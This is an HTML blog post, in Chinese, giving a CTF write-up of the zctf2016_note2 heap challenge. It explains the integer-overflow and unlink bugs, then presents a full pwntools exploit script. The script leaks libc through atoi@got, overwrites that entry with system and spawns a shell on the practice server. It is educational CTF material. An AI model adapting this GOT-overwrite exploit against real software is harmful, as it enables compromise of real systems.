@@ -1,0 +1,68 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>BUU-zctf2016_note2-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="这大概是某省的一道年代久远的赛题，也是unlink，和这道hitcon2014_stkof相比，区别大致如下： 多了一个可用的输出函数，可以帮"><meta property="og:image" content><meta property="og:title" content="BUU-zctf2016_note2-WP"><meta property="og:description" content="这大概是某省的一道年代久远的赛题，也是unlink，和这道hitcon2014_stkof相比，区别大致如下： 多了一个可用的输出函数，可以帮"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/buu-zctf2016_note2-wp.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-12-24T10:13:00+00:00"><meta property="article:modified_time" content="2020-12-24T10:13:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="BUU-zctf2016_note2-WP"><meta name=twitter:description content="这大概是某省的一道年代久远的赛题，也是unlink，和这道hitcon2014_stkof相比，区别大致如下： 多了一个可用的输出函数，可以帮"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>BUU-zctf2016_note2-WP</h1><div class=meta>Posted on Dec 24, 2020</div></div><section class=body><p>这大概是某省的一道年代久远的赛题，也是unlink，和这道<strong><a href="https://www.cjovi.icu/?p=810">hitcon2014_stkof</a></strong>相比，区别大致如下：</p><ul><li>多了一个可用的输出函数，可以帮助我们泄露</li><li>编辑操作时使用了strcpy函数，这样我们就不能在字符串中间出现'\x00'。所以虽然编辑操作是UAF的，我们也无法真正利用</li><li>new note操作时，如果指定长度为0，就会出现整数溢出，可以输入足够长的字符串，在这里的利用会出现一个矛盾，通过溢出我们可以很容易地通过修改下一个chunk实现unlink利用，但是当我们在new note的时候下一个chunk是没有被创建的。所以我们可以考虑利用fast bin，先删除一个长度为0（指定长度为0，实际长为0x20）的chunk，在申请了下一个chunk之后再把这个chunk申请回来，就可以实现利用。</li></ul><p>最后实现的效果仍然是修改.bss段的</p><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/12/QQ截图20201224101022.png alt class=wp-image-831></figure></div><p>这个指针数组，注意这道题我们只要编辑note_ptr_array[0]就可以了，只要先覆盖为atoi@got就可以泄露libc获取基地址，然后算出system@plt再一次编辑note_ptr_array[0]就可以覆写atoi@got为system@plt，避开了编辑操作对'\x00'的限制</p><p>下面是exp：</p><pre class=wp-block-code><code>#!/usr/bin/env python
+# coding=utf-8
+from pwn import *
+
+def new_note(size,payload):
+    sh.sendlineafter("--->>\n",'1')
+    sh.sendlineafter("(less than 128)\n",str(size))
+    sh.sendlineafter("content:\n",payload)
+
+def edit(index,payload):
+    sh.sendlineafter("--->>\n","3")
+    sh.sendlineafter("id of the note:\n",str(index))
+    sh.sendlineafter("2.append]\n","1")
+    sh.sendlineafter("TheNewContents:",payload)
+
+def free(index):
+    sh.sendlineafter("--->>\n","4")
+    sh.sendlineafter("note:",str(index))
+
+def show(index):
+    sh.sendlineafter("--->>\n","2")
+    sh.sendlineafter("the note:\n",str(index))
+
+#sh = process("./note2")
+sh = remote("node3.buuoj.cn","26367")
+context(log_level = 'debug')
+note_ptr_array = 0x602120
+elf = ELF("./note2")
+libc = ELF("./buu-libc-2.23.so")
+
+sh.sendlineafter("Input your name:\n","pwn")
+sh.sendlineafter("Input your address:\n","lalala")
+
+fake_chunk = 'a' * 8 + p64(0x61) + p64(note_ptr_array - 0x18) + p64(note_ptr_array - 0x10)
+fake_chunk += 'a'*64 + p64(0x60)
+new_note(0x80,fake_chunk)
+
+new_note(0,'a' * 8)
+new_note(0x80,'a' * 16)
+
+free(1)
+
+payload = 'a' * 16 + p64(0x90 + 0x20 - 0x10) + p64(0x90)
+new_note(0,payload)
+
+free(2)
+
+payload = 'a' * 0x18 + p64(elf.got["atoi"])
+edit(0,payload)
+
+show(0)
+sh.recvuntil("Content is ")
+atoi_addr = u64(sh.recvuntil("\n",drop = True).ljust(8,'\x00'))
+
+system_addr = atoi_addr - libc.symbols["atoi"] + libc.symbols["system"]
+
+edit(0,p64(system_addr))
+
+sh.sendlineafter("--->>\n","/bin/sh")
+
+sh.interactive()</code></pre><p>这篇WP写的很简陋，只是我对本题的一个总结,具体可以参考<a href=https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/#2016-zctf-note2>WIKI</a></p></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
